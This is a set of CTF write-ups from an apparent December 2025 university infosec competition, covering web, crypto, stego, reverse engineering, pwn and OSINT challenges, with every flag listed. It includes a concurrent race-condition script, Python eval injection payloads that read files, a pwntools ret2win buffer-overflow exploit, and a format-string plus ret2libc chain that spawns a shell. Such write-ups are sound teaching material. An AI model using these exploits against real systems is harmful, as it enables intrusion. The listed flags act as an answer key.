# NYP-Infosec-CTF-Writeups
Collection of CTF writeups from NYP Infosec CTF (December 2025). Includes web exploits (race conditions, eval injection), cryptographic challenges (RSA, XOR, substitution ciphers), steganography, OSINT, binary exploitation (ret2win, ret2libc), and reverse engineering.

# NYP Infosec CTF Writeups — All Challenges  
**Author:** Eng Jian Wei  
**Collected:** December 2025

Short: Comprehensive writeups covering web security, cryptography, steganography, forensics, OSINT, reverse engineering, and binary exploitation challenges from NYP Infosec CTF.

---

## Table of Contents
- [Summary / Results](#summary--results)
- [Web Challenges](#web-challenges)
  - [1 — One Button](#1--one-button)
  - [2 — Horse Games (Race Condition)](#2--horse-games-race-condition)
  - [3 — Stupid Calculator](#3--stupid-calculator)
  - [4 — New Year Hidden Gift](#4--new-year-hidden-gift)
- [Cryptography Challenges](#cryptography-challenges)
  - [5 — Distractions Hide the Truth](#5--distractions-hide-the-truth)
  - [6 — Username-Password ROT18](#6--username-password-rot18)
  - [7 — Poké Cup XOR](#7--poké-cup-xor)
  - [8 — Number Substitution Cipher](#8--number-substitution-cipher)
  - [9 — RSA Low Exponent](#9--rsa-low-exponent)
  - [10 — NewYearNewNewYear Binary](#10--newyearnewnewyear-binary)
- [Steganography / Forensics](#steganography--forensics)
  - [11 — He Haunts Me](#11--he-haunts-me)
  - [12 — Golden Countdown](#12--golden-countdown)
- [Reverse Engineering](#reverse-engineering)
  - [13 — Waiting.html (JSFuck)](#13--waitinghtml-jsfuck)
  - [14 — First Rev (Ghidra)](#14--first-rev-ghidra)
  - [15 — Midnight XOR](#15--midnight-xor)
- [Binary Exploitation (Pwn)](#binary-exploitation-pwn)
  - [16 — freepwn (ret2win)](#16--freepwn-ret2win)
  - [17 — Oricorio Pom-Pom (ret2libc)](#17--oricorio-pom-pom-ret2libc)
- [OSINT](#osint)
  - [18 — New Year Letter](#18--new-year-letter)

---

## Summary / Results

| Challenge | Category | Flag |
|-----------|----------|------|
| One Button | Web | `NYP{it_was_this_easy}` |
| Horse Games | Web / Race Condition | `NYP{1_L0v3_Hor5e_6am8lin}` |
| Stupid Calculator | Web / Code Injection | `NYP{s1x_sayven}` |
| New Year Hidden Gift | Web | `NYP{H3R3_Y0UR_$URPR1$3_G1F7}` |
| Distractions Hide the Truth | Crypto / Encoding | `NYP{d1str4ctions_hide_the_truth}` |
| Username-Password ROT18 | Crypto | `NYP{h0W_D1d_y0u_F0uN4_m3}` |
| Poké Cup XOR | Crypto | `NYP{p0kemon_f1r3_Red}` |
| Number Substitution | Crypto | `nyp{crackers_for_you}` |
| RSA Low Exponent | Crypto | `NYP{SHOULD_HAVE_USED_2**16+1}` |
| NewYearNewNewYear | Crypto / Binary | `NYP{NEW_YEAR_2026!!}` |
| He Haunts Me | Stego | `NYP{he_haunts_me}` |
| Golden Countdown | Forensics | `NYP{TH15_15_4_J0Jo_R3F3ReNCE}` |
| Waiting.html | Rev / JSFuck | `NYP{EsoLangs_are_strange}` |
| First Rev | Rev | `NYP{C0ngr4ts_0n_Y0ur_F1rst_R3v!!!}` |
| Midnight XOR | Rev | `NYP{M1dn1ght_X0R_2026!R3v3rs3d}` |
| freepwn | Pwn | `NYP{PWn_iS_s0_3azy_gAng}` |
| Oricorio Pom-Pom | Pwn | `NYP{Or1cori0_1s_tH3_cAnArY}` |
| New Year Letter | OSINT | `NYP{PURNELL,WILSON,}` |

---

## Web Challenges

### 1 — One Button

**Category:** Web  
**Difficulty:** Very Easy  
**Flag:** `NYP{it_was_this_easy}`

**Challenge Description:**  
A minimal webpage with a single button that triggers a decoy alert when clicked.

**Solution:**  
The hint "Only those who look up will find the sky" suggests checking HTTP headers rather than client-side code.

1. Open DevTools → Network tab
2. Reload the page
3. Inspect Response Headers of the main document

**Discovery:**
```
X-Flag: NYP{it_was_this_easy}
```

**Key Takeaway:** "Look up" = HTTP headers appear above HTML content.

---

### 2 — Horse Games (Race Condition)

**Category:** Web / Race Condition  
**Difficulty:** Medium  
**Flag:** `NYP{1_L0v3_Hor5e_6am8lin}`

**Vulnerability Analysis:**  
The server uses a global dictionary for game state with non-atomic updates:
```python
game_db[user]['horsey'] += 30      # read → modify → write
game_db[user]['evil_horsey'] += 40
```

Normal gameplay: evil horse always wins (reaches 100% first).

**Exploit Strategy:**  
Send concurrent requests to `/api/run` to cause race conditions where `horsey` reaches 100% before `evil_horsey`.

**Exploit Script:**
```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "https://horse-games.nypinfosec.net"

def hit(sess):
    r = sess.get(f"{BASE}/api/run", timeout=10)
    j = r.json()
    if j.get("status") == "win":
        return j.get("message")
    return None

def main():
    sess = requests.Session()
    sess.get(f"{BASE}/")  # Initialize session
    
    for batch in range(50):
        with ThreadPoolExecutor(max_workers=100) as ex:
            futures = [ex.submit(hit, sess) for _ in range(200)]
            for fut in as_completed(futures):
                if msg := fut.result():
                    print("✅ WIN:", msg)
                    return

if __name__ == "__main__":
    main()
```

---

### 3 — Stupid Calculator

**Category:** Web / Code Injection  
**Difficulty:** Easy  
**Flag:** `NYP{s1x_sayven}`

**Vulnerability:**  
The calculator uses Python's `eval()` on user input without sanitization.

**Exploitation:**
```
Payload: ().__class__.__name__
Output: tuple

Payload: open("flag.txt").read()
Output: NYP{s1x_sayven}
```

**Remediation:** Never use `eval()` on user input. Use safe math parsers instead.

---

### 4 — New Year Hidden Gift

**Category:** Web  
**Difficulty:** Easy  
**Flag:** `NYP{H3R3_Y0UR_$URPR1$3_G1F7}`

**Challenge:** Flag fragments hidden in rapid redirect chain.

**Solution:**
1. Use `curl --compressed` to fetch redirect pages manually
2. Find hidden `<p>` elements with Base64-encoded IDs

**Fragments Found:**
```html
<!-- /newyeargift1 -->
<p id="TllQe0gzUjNfWTBVUg==">...</p>
→ NYP{H3R3_Y0UR

<!-- /newyeargift2 -->
<p id="XyRVUlBSMSQzX0cxRjd9">...</p>
→ _$URPR1$3_G1F7}
```

**Combined:** `NYP{H3R3_Y0UR_$URPR1$3_G1F7}`

---

## Cryptography Challenges

### 5 — Distractions Hide the Truth

**Category:** Crypto / Encoding  
**Difficulty:** Medium  
**Flag:** `NYP{d1str4ctions_hide_the_truth}`

**Analysis:**
- Hex decode → "you just got rick rolled" (decoy)
- Base64 decode → `NYP{the_answer_is_in_this_file}` (hint, not flag)
- S/T/L pattern → Binary encoding (S=0, T=1)

**Solution:**
Ignore leading S characters, interpret remaining S/T as binary:
```
S = 0, T = 1 → 8-bit ASCII
```

---

### 6 — Username-Password ROT18

**Category:** Crypto  
**Difficulty:** Easy  
**Flag:** `NYP{h0W_D1d_y0u_F0uN4_m3}`

**Cipher:** ROT18 (ROT13 for letters + ROT5 for digits)

**Decoding:**
```
Input:  ALC{u5J_Q6q_l5h_S5hA9_z8}
ROT13:  NYP{h_W_D_d_y_u_F_uN__m_}
ROT5:   5→0, 6→1, 9→4, 8→3
Output: NYP{h0W_D1d_y0u_F0uN4_m3}
```

---

### 7 — Poké Cup XOR

**Category:** Crypto / XOR  
**Difficulty:** Medium  
**Flag:** `NYP{p0kemon_f1r3_Red}`

**Analysis:**  
Team Rocket messages in battle logs are Base64-encoded XOR ciphertext.

**Key Discovery:**
```
USE_KEY_'SunAndMoon'_TO_DECRYPT
```

**Solver:**
```python
import base64

cipher = base64.b64decode("I0UFJAMLIzAJXyFGMRMLAA==")
key = b"SunAndMoon"

plain = bytes(b ^ key[i % len(key)] for i, b in enumerate(cipher))
print("NYP{" + plain.decode() + "}")
```

---

### 8 — Number Substitution Cipher

**Category:** Crypto  
**Difficulty:** Easy  
**Flag:** `nyp{crackers_for_you}`

**Cipher Type:** Monoalphabetic substitution (1-26 → A-Z)

**Crib:** "Famous Lyrics" section matches "never gonna give you" (Rick Astley)

**Mapping Built:**
| Number | Letter |
|--------|--------|
| 25 | n |
| 22 | e |
| 9 | v |
| 24 | r |
| ... | ... |

---

### 9 — RSA Low Exponent

**Category:** Crypto / RSA  
**Difficulty:** Easy  
**Flag:** `NYP{SHOULD_HAVE_USED_2**16+1}`

**Vulnerability:** e=3 with no padding → m³ < n → no modular reduction

**Attack:** Compute integer cube root of ciphertext

```python
def iroot3(n):
    lo, hi = 0, 1
    while hi**3 <= n:
        hi <<= 1
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if mid**3 <= n:
            lo = mid
        else:
            hi = mid
    return lo

m = iroot3(ct)
flag = m.to_bytes((m.bit_length() + 7) // 8, "big")
```

---

### 10 — NewYearNewNewYear Binary

**Category:** Crypto / Binary Encoding  
**Difficulty:** Very Easy  
**Flag:** `NYP{NEW_YEAR_2026!!}`

**Encoding:** `New` = 0, `Year` = 1, 8 words per line = 1 byte

**Example:**
```
NewYearNewNewYearYearYearNew
→ 01001110 → 'N'
```

---

## Steganography / Forensics

### 11 — He Haunts Me

**Category:** Stego  
**Difficulty:** Very Easy  
**Flag:** `NYP{he_haunts_me}`

**Tool:** Aperi'Solve / ExifTool

**Discovery:**
```
Comment: NYP{he_haunts_me}
```

Flag embedded in GIF comment metadata field.

---

### 12 — Golden Countdown

**Category:** Forensics  
**Difficulty:** Very Easy  
**Flag:** `NYP{TH15_15_4_J0Jo_R3F3ReNCE}`

**Discovery (ExifTool):**
```
Artist: NYP{TH15_15_4_J0Jo_R3F3ReNCE}
```

Flag stored in PNG tEXt metadata chunk.

---

## Reverse Engineering

### 13 — Waiting.html (JSFuck)

**Category:** Rev / Esoteric  
**Difficulty:** Easy  
**Flag:** `NYP{EsoLangs_are_strange}`

**Challenge:** HTML with 1-hour timeout and JSFuck-obfuscated flag.

**Solution:** Extract and evaluate the `let flag = ...` expression offline:
```bash
node -e "const fs=require('fs');const html=fs.readFileSync('Waiting.html','utf8');
const start=html.indexOf('let flag =')+'let flag ='.length;
const expr=html.slice(start).split('\n        \n')[0].trim();
console.log(eval(expr));"
```

---

### 14 — First Rev (Ghidra)

**Category:** Rev  
**Difficulty:** Very Easy  
**Flag:** `NYP{C0ngr4ts_0n_Y0ur_F1rst_R3v!!!}`

**Solution:**
1. Open binary in Ghidra
2. Find `strcmp(input, "My5tr0ngP@ssw0rd123!")`
3. Correct password triggers XOR decryption loop revealing flag

---

### 15 — Midnight XOR

**Category:** Rev  
**Difficulty:** Very Easy  
**Flag:** `NYP{M1dn1ght_X0R_2026!R3v3rs3d}`

**Solution:** Flag stored in plaintext within the binary — simple strings extraction.

---

## Binary Exploitation (Pwn)

### 16 — freepwn (ret2win)

**Category:** Pwn  
**Difficulty:** Very Easy  
**Flag:** `NYP{PWn_iS_s0_3azy_gAng}`

**Vulnerability:**
```c
char buf[32];
read(0, buf, 64);  // Buffer overflow!
```

**Exploit:**
```python
from pwn import *

elf = ELF("./chal")
rop = ROP(elf)

OFFSET = 40  # 32 + 8 (saved RBP)
win = elf.symbols["win"]
ret = rop.find_gadget(["ret"])[0]

io = remote("chall.nypinfosec.net", 8000)
io.recvline()

payload = b"A"*OFFSET + p64(ret) + p64(win)
io.send(payload)
io.interactive()
```

---

### 17 — Oricorio Pom-Pom (ret2libc)

**Category:** Pwn  
**Difficulty:** Medium  
**Flag:** `NYP{Or1cori0_1s_tH3_cAnArY}`

**Protections:** Full RELRO, Stack Canary, NX, PIE

**Vulnerabilities:**
1. Format string: `printf(pokemon)` → leak canary + libc address
2. Stack overflow: `read(0, info, 0x100)` into 0x20 buffer

**Exploit Chain:**
1. Leak canary via `%9$p`
2. Leak libc address via `%1$p`
3. Calculate libc base (offset: 0x211643)
4. Overflow with: `padding (0x28) + canary + rbp + ROP chain`
5. ROP: `pop rdi; ret` → `/bin/sh` → `system()`

---

## OSINT

### 18 — New Year Letter

**Category:** OSINT  
**Difficulty:** Easy  
**Flag:** `NYP{PURNELL,WILSON,}`

**Challenge:** Find company directors behind howlongagogo.com

**Solution:**
1. Website footer → "Web Daddy project"
2. UK Companies House → WEB DADDY LIMITED
3. Directors: Simon **Purnell**, James Antony **Wilson**
4. Alphabetical order: PURNELL, WILSON

---

## Tools Used

- **Web:** Browser DevTools, curl, Python requests
- **Crypto:** Python, CyberChef
- **Stego/Forensics:** Aperi'Solve, ExifTool, strings
- **Rev:** Ghidra, Node.js
- **Pwn:** pwntools, GDB
- **OSINT:** UK Companies House

---

*Created by Eng Jian Wei — December 2025*
